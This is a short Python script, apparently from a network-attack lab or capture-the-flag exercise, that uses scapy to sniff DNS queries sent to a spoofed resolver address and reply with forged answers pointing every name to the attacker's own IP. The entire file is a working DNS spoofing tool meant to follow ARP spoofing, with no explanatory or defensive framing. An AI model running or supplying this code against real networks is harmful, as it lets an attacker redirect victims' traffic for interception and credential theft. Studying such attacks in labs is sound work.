#dns_final.py
#as much as possible, grab the info that is repeated in the
#  response directly from the query rather than hard code it

from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 MAC
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
spoofedIP = '10.6.6.53'

def handle_dns_request(packet):
    eth = Ether(src=macaddr, dst=packet[Ether].src)
    ip  = IP(dst=packet[IP].src, src=spoofedIP)
    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
    dns = DNS(id=packet[DNS].id, qr=1, opcode='QUERY', aa=0,
              rd=1, ra=1, rcode='ok',
              qdcount = 1,
              ancount = 1,
              nscount = 0,
              arcount = 0,
              qd = packet[DNS].qd,
              an = DNSRR(rrname = packet[DNS].qd.qname,
                         type = packet[DNS].qd.qtype,
                         rclass = packet[DNS].qd.qclass,
                         ttl = 3600,
                         rdata = ipaddr
                         )
              )
    dns_response = eth / ip / udp / dns
    print(dns_response.show())
    sendp(dns_response, iface="eth0")
    return

berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                   # dns
        "udp[10] & 0x80 = 0",                # dns request
        "dst host {}".format(spoofedIP),     # destination ip we had spoofed 
        "ether dst host {}".format(macaddr)  # our macaddress since we spoofed the ip to our mac
] )

sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, count=1)
